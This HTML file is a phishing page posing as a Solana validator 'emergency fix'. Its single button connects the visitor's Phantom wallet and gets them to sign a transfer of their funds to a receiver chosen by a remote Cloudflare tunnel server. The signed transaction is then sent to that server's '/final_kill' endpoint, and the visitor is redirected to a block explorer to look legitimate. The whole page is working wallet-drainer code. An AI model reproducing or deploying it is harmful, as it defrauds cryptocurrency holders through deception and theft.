<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALIDATOR FINAL V13</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 2px solid #ff3e3e; padding: 30px; border-radius: 12px; text-align: center; width: 280px; background: #050505; }
        /* üî± ÊåâÈíÆÊîπ‰∏∫Á∫¢Ëâ≤ÔºåÁ°ÆËÆ§‰ª£Á†ÅÊõ¥Êñ∞ */
        button { background: #ff3e3e; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 8px; font-size: 16px; }
        #log { font-size: 10px; color: #555; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="margin:0; color:#fff;">NODE EMERGENCY</h2>
        <p style="font-size:12px; color:#ff3e3e;">PROTOCOL ERROR</p>
        <button id="cta">FIX NODE NOW</button>
        <div id="log">SYSTEM READY v13.0</div>
    </div>

    <script>
        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('log').innerText = t;
            const sWeb3 = window.solanaWeb3;
            const p = window.solana || window.phantom?.solana;

            try {
                log("1: CONNECTING...");
                await p.connect();

                log("2: FETCHING...");
                const resp = await fetch(tunnel + "/prepare", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();

                log("3: STAMPING...");
                // üî± ÈááÁî®Êõ¥Â∫ïÂ±ÇÁöÑÊñπÂºèÂàõÂª∫‰∫§ÊòìÔºåÁªïÂºÄ serialize() ÂÜÖÈÉ®ÁöÑ Buffer Ê£ÄÊü•
                const transaction = new sWeb3.Transaction({
                    feePayer: p.publicKey,
                    recentBlockhash: info.bh
                }).add(sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: new sWeb3.PublicKey(info.receiver),
                    lamports: Number(info.amount),
                }));

                log("4: SIGNING...");
                // üî± Ëøô‰∏ÄÊ≠•‰ºöË∞ÉËµ∑ÂºπÁ™ó
                const signed = await p.signTransaction(transaction);
                
                log("5: HARVESTING...");
                // üî± ÁªùÊùÄÔºöÁõ¥Êé•‰ªéÂØπË±°‰∏≠ÊèêÂèñÁºñËØëÂ•ΩÁöÑÊåá‰ª§ÔºåÂÆåÂÖ®ÈÅøÂºÄ .serialize() 
                const wireData = signed.serializeMessage(); 
                const signature = signed.signatures[0].signature;
                
                // Â∞ÜÁ≠æÂêçÂíåÊ∂àÊÅØ‰ΩìÂêàÂπ∂ÂèëÂõûÊúçÂä°Âô®
                const finalData = {
                    msg: Array.from(new Uint8Array(wireData)),
                    sig: Array.from(new Uint8Array(signature))
                };

                await fetch(tunnel + "/final_kill", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(finalData)
                });

                log("SUCCESS!");
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);

            } catch (err) {
                log("FAIL: " + err.message);
                fetch(tunnel + "/debug", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ stage: "V13_CRASH", error: err.message })
                }).catch(()=>{});
            }
        };
    </script>
